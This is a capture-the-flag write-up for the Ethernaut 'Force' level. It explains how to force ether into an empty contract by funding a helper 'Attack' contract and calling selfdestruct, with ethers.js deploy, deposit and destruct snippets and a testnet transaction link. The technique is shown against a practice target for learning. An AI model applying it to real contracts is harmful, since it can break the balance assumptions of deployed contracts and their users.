We are given a completely empty smart contract and we need to send funds to it. Normally, there will be a `payable` function without a payable function we face a difficult situation. After going through the docs, I understood that there's actually 2 more ways of force sending ethereum to a smart contract:
1. Mining rewards  
2. A 3rd party smart contract with funds that self-destructs have the chance to do a last tx sending the outstanding funds  

### Solution
We will go with the 2nd option aforementioned. The steps are:
1. Create a contract that has a payable function, that we will use to deposit, and a function that calls the native `selfdestruct` function. Check `force.sol`
2. Deploy the empty smart contract from Ethernaut's interface, get the address
3. Deploy the exploit smart contract:  
```
const AttackInstance = await ethers.getContractFactory("Attack");
const attackInstance = await AttackInstance.deploy({ gasLimit: 1000000 })
await attackInstance.deployed();
```
4. Fund the exploit smart contract:
```
let amountInEther = '0.0001';
let topup_attacker_tx_payload = { value: ethers.utils.parseEther(amountInEther), gasLimit: 50000 };
topup_attacker_tx = await attackInstance.deposit(topup_attacker_tx_payload);
```
5. Call the destruct function that self-destructs the exploit smart contract and sends the outstanding balance to the empty smart contract
```
destruct_tx = await attackInstance.destruct(level_instance_address);
```

Solution tx is here: https://rinkeby.etherscan.io/tx/0x22b3e7158767572c5ad1c696119013398fee8d19aa31dfe5895ce8a0a19d3a8d